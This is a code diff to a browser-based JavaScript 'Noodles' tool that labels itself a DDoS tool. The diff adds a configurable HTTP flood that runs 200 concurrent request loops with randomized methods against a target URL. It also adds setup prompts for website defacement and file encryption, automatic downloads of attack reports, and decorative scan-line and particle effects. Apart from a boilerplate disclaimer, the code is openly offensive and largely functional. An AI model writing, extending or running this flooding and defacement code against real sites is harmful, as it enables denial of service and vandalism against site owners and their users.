@@ -40,7 +40,6 @@ class Tor {
         this.failedGateways = new Set();
         this.maxRetries = 5;
         this.requestTimeout = 8000;
-        this.gatewayCheckInterval = 30000;
         this.userAgent = 'Noodles/1.0 (DDoS Tool)';
         this.customHeaders = {};
         this.requestQueue = [];
@@ -79,7 +78,6 @@ class Tor {
         this.gatewayCheckEnabled = true;
         this.isCheckingGateways = false;
         this.gatewayCheckTimeout = 5000;
-        this.checkGatewayOnFailure = true;
 
         // New properties and initialization for Noodles requirements
         this.fileEncryptionKey = null;
@@ -101,6 +99,37 @@ class Tor {
         this.initializeUI();
         this.NoodlesDisclaimer = "Noodles Inc. is NOT responsible for unauthorized use. Unauthorized use is illegal. Use at your own risk.";
         this.initializeNoodles();
+
+        // DDoS-specific configurations
+        this.ddosConfig = {
+            threads: 200,          // Default number of threads for DDoS attacks
+            duration: 60,           // Default duration in seconds
+            requestDelay: 0,        // Delay between requests in milliseconds
+            payloadSize: 1024,      // Size of the payload in bytes
+            httpMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], // HTTP methods to use
+            customHeaders: {         // Custom headers to include in requests
+                'X-Noodles-Attack': 'DDoS'
+            }
+        };
+
+        // File encryption-specific configurations
+        this.encryptionConfig = {
+            algorithm: "AES-GCM",  // Default encryption algorithm
+            keyLength: 256,          // Default key length in bits
+        };
+
+        // Defacement-specific configurations
+        this.defacementConfig = {
+            backupBeforeDeface: true, // Automatically back up the website before defacing
+            restoreOnExit: true      // Automatically restore the website when the tool is closed
+        };
+
+        // Reporting-specific configurations
+        this.reportingConfig = {
+            autoSaveInterval: 30000, // Interval for automatically saving reports in milliseconds
+            reportFormat: "JSON"      // Default report format
+        };
+
     }
 
     // Noodles Initialization and Global Consent
@@ -111,6 +140,13 @@ class Tor {
             this.logToConsole("Noodles initialized with user consent.");
             this.displayDisclaimer();
             this.startGatewayMonitoring();
+
+            // Additional setup actions here
+            this.setupDDoS();
+            this.setupEncryption();
+            this.setupDefacement();
+            this.startAutoReportSaving();
+
         } else {
             this.closeSite();
         }
@@ -205,6 +241,26 @@ class Tor {
         return JSON.stringify(this.reportFindings, null, 2);
     }
 
+    startAutoReportSaving() {
+        setInterval(() => {
+            const report = this.generateReport();
+            this.saveReportToFile(report);
+            this.logToConsole("Report auto-saved.");
+        }, this.reportingConfig.autoSaveInterval);
+    }
+
+    saveReportToFile(report) {
+        const blob = new Blob([report], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = `NoodlesReport_${new Date().toISOString()}.${this.reportingConfig.reportFormat.toLowerCase()}`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        URL.revokeObjectURL(url);
+    }
+
     // Defacement Tool Functions
 
     async backupWebsite(url) {
@@ -279,17 +335,25 @@ class Tor {
     }
 
     // DDoS Tool Functions
-    async startDDoS(url, threads = 100, duration = 60) {
-        this.startAttack('DDOS', url, { threads, duration });
+
+    setupDDoS() {
+        this.ddosConfig.threads = parseInt(prompt("Enter number of threads for DDoS (default: 200):") || this.ddosConfig.threads);
+        this.ddosConfig.duration = parseInt(prompt("Enter duration in seconds for DDoS (default: 60):") || this.ddosConfig.duration);
+        this.logToConsole("DDoS setup complete.");
+    }
+
+    async startDDoS(url) {
+        this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
         this.ddosThreads = [];
 
-        const endTime = Date.now() + (duration * 1000);
+        const endTime = Date.now() + (this.ddosConfig.duration * 1000);
         let requestCount = 0;
 
         const attackThread = async () => {
             while (Date.now() < endTime) {
                 try {
-                    const response = await this.rawFetch(url, { method: 'GET' });
+                    const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)];
+                    const response = await this.rawFetch(url, { method: method, headers: this.ddosConfig.customHeaders });
                     if (!response.ok) {
                         this.log(`Request failed with status: ${response.status}`, 'warn');
                     }
@@ -297,24 +361,35 @@ class Tor {
                 } catch (error) {
                     this.log(`Request error: ${error}`, 'error');
                 }
+                await this.delay(this.ddosConfig.requestDelay);
             }
         };
 
-        for (let i = 0; i < threads; i++) {
+        for (let i = 0; i < this.ddosConfig.threads; i++) {
             this.ddosThreads.push(attackThread());
         }
 
         await Promise.all(this.ddosThreads);
 
-        this.endAttack('DDOS', url, { totalRequests: requestCount, threads });
-        this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${threads} threads.`);
+        this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
+        this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${this.ddosConfig.threads} threads.`);
     }
 
     stopDDoS() {
         this.stopAttack();
     }
 
+    delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
     // File Encryption Tool Functions
+    setupEncryption() {
+        this.encryptionConfig.algorithm = prompt("Enter encryption algorithm (default: AES-GCM):") || this.encryptionConfig.algorithm;
+        this.encryptionConfig.keyLength = parseInt(prompt("Enter key length in bits (default: 256):") || this.encryptionConfig.keyLength);
+        this.logToConsole("Encryption setup complete.");
+    }
+
     async encryptFile(file, key) {
         this.fileEncryptionKey = key;
         const reader = new FileReader();
@@ -325,7 +400,7 @@ class Tor {
             try {
                 const encryptedContent = await window.crypto.subtle.encrypt(
                     {
-                        name: "AES-GCM",
+                        name: this.encryptionConfig.algorithm,
                         iv: iv
                     },
                     cryptoKey,
@@ -372,7 +447,7 @@ class Tor {
                 try {
                     const decryptedContent = await window.crypto.subtle.decrypt(
                         {
-                            name: "AES-GCM",
+                            name: this.encryptionConfig.algorithm,
                             iv: iv
                         },
                         cryptoKey,
@@ -415,16 +490,154 @@ class Tor {
         return window.crypto.subtle.importKey(
             "raw",
             hash,
-            "AES-GCM",
+            this.encryptionConfig.algorithm,
             false,
             ["encrypt", "decrypt"]
         );
     }
 
+    // Defacement Tool Setup
+    setupDefacement() {
+        this.defacementConfig.backupBeforeDeface = confirm("Backup website before defacing? (Recommended)");
+        this.defacementConfig.restoreOnExit = confirm("Restore website on exit? (Recommended)");
+        this.logToConsole("Defacement setup complete.");
+    }
+
+
     // UI Initialization (Placeholder)
     initializeUI() {
         this.applyDarkTheme();
         this.logToConsole("UI initialized.");
+
+        // Implement scan lines effect
+        this.createScanLines();
+
+        // Implement particle effect
+        this.createParticles();
+    }
+
+    // Scan Lines Effect
+    createScanLines() {
+        const canvas = document.createElement('canvas');
+        canvas.id = 'scanLinesCanvas';
+        canvas.style.position = 'fixed';
+        canvas.style.top = '0';
+        canvas.style.left = '0';
+        canvas.style.width = '100%';
+        canvas.style.height = '100%';
+        canvas.style.pointerEvents = 'none';
+        canvas.style.zIndex = '9999';
+        document.body.appendChild(canvas);
+
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const drawScanLines = () => {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.strokeStyle = 'rgba(0, 255, 0, 0.1)'; // Dark Green
+            ctx.lineWidth = 0.5;
+
+            for (let y = 0; y < canvas.height; y += 4) {
+                ctx.beginPath();
+                ctx.moveTo(0, y);
+                ctx.lineTo(canvas.width, y);
+                ctx.stroke();
+            }
+        };
+
+        drawScanLines();
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            drawScanLines();
+        });
+
+        this.logToConsole("Scan lines effect created.");
+    }
+
+    // Particle Effect
+    createParticles() {
+        const canvas = document.createElement('canvas');
+        canvas.id = 'particlesCanvas';
+        canvas.style.position = 'fixed';
+        canvas.style.top = '0';
+        canvas.style.left = '0';
+        canvas.style.width = '100%';
+        canvas.style.height = '100%';
+        canvas.style.pointerEvents = 'none';
+        canvas.style.zIndex = '9998';
+        document.body.appendChild(canvas);
+
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const particles = [];
+        const particleCount = 50;
+
+        for (let i = 0; i < particleCount; i++) {
+            particles.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                size: Math.random() * 3 + 1,
+                speedX: Math.random() * 2 - 1,
+                speedY: Math.random() * 2 - 1,
+                color: `rgba(148,0,211,0.7)` // Dark Purple
+            });
+        }
+
+        const drawParticles = () => {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => {
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fillStyle = p.color;
+                ctx.fill();
+                p.x += p.speedX;
+                p.y += p.speedY;
+
+                if (p.x < 0 || p.x > canvas.width) p.speedX = -p.speedX;
+                if (p.y < 0 || p.y > canvas.height) p.speedY = -p.speedY;
+            });
+            requestAnimationFrame(drawParticles);
+        };
+
+        drawParticles();
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        this.logToConsole("Particle effect created.");
+    }
+
+    // Utilities
+    rawFetch(url, options = {}) {
+        return fetch(url, options);
+    }
+
+    startAttack(attackType, targetURL, config = {}) {
+        this.activeAttackType = attackType;
+        this.targetURL = targetURL;
+        this.attackConfig = config;
+        this.attackStartTime = new Date();
+        this.logToConsole(`${attackType} attack started on ${targetURL} at ${this.attackStartTime.toISOString()} with config: ${JSON.stringify(config)}`);
+    }
+
+    stopAttack() {
+        if (this.activeAttackType) {
+            this.endAttack(this.activeAttackType, this.targetURL, this.attackConfig);
+        }
+    }
+
+    endAttack(attackType, targetURL, config = {}) {
+        this.attackEndTime = new Date();
+        const duration = (this.attackEndTime - this.attackStartTime) / 1000;
+        this.logToConsole(`${attackType} attack ended on ${targetURL} at ${this.attackEndTime.toISOString()} after ${duration} seconds with config: ${JSON.stringify(config)}`);
+        this.activeAttackType = null;
+        this.targetURL = null;
+        this.attackConfig = {};
     }
 }
 
